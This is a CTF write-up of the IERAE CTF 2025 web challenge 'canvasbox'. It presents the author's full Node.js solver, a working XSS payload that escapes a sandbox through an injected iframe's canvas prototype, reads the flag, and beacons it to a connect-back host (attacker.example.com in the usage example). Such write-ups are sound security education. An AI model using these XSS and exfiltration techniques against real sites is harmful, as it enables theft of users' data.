---
title: "Canvasbox - IERAE CTF 2025"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "xss", "canvasbox", "web", "ierae-ctf-2025"]
summary: "The flag is hidden in the canvas."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202506_IERAE_CTF_2025/web/canvasbox"
license: "none stated"
ctf:
  name: "IERAE CTF 2025"
  year: 2025
  challenge: "Canvasbox"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202506_IERAE_CTF_2025/web/canvasbox>
- **CTF:** IERAE CTF 2025

---

# [web] canvasbox

## Description

The flag is hidden in the canvas. You cannot access it, even with XSS...

- Challenge: `http://{web.host}:{web.port}`
- Admin bot: `http://{bot.host}:{bot.port}`

## Attachments

- [canvasbox](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202506_IERAE_CTF_2025/web/canvasbox/solution/index.js>

```javascript
import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

// Solution 1
// ref. https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseXML
const xss = `
const xhr = new window.XMLHttpRequest();
xhr.open(
  "GET",
  "data:text/html,<iframe name=evil srcdoc=foobar></iframe>"
);
xhr.responseType = "document";
xhr.onload = () => {
  setTimeout(() => {
    const body = document.lastChild.lastChild;
    const iframe = xhr.responseXML.lastChild.lastChild.firstChild;
    body.appendChild(iframe);

    const font = document.evil.HTMLCanvasElement.prototype.getContext.call(flag, "2d").font;
    navigator.sendBeacon("${CONNECTBACK_URL}", font);
  }, 1000);
};
xhr.send();
`.trim();

// // Solution 2
// // ref. https://developer.mozilla.org/en-US/docs/Web/API/Range/createContextualFragment
// const xss = `
// const body = document.lastChild.lastChild;
// const fragment = new Range().createContextualFragment("<iframe name=evil srcdoc=foobar></iframe>");
// const iframe = fragment.lastChild;
// body.appendChild(iframe);
//
// const font = document.evil.HTMLCanvasElement.prototype.getContext.call(flag, "2d").font;
// navigator.sendBeacon("${CONNECTBACK_URL}", font);
// `.trim();

const url = `http://web:3000?${new URLSearchParams({ xss })}`;

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3_000);
  await reportUrl(url);

  await sleep(3_000);
  assert.fail("Failed");
});
```
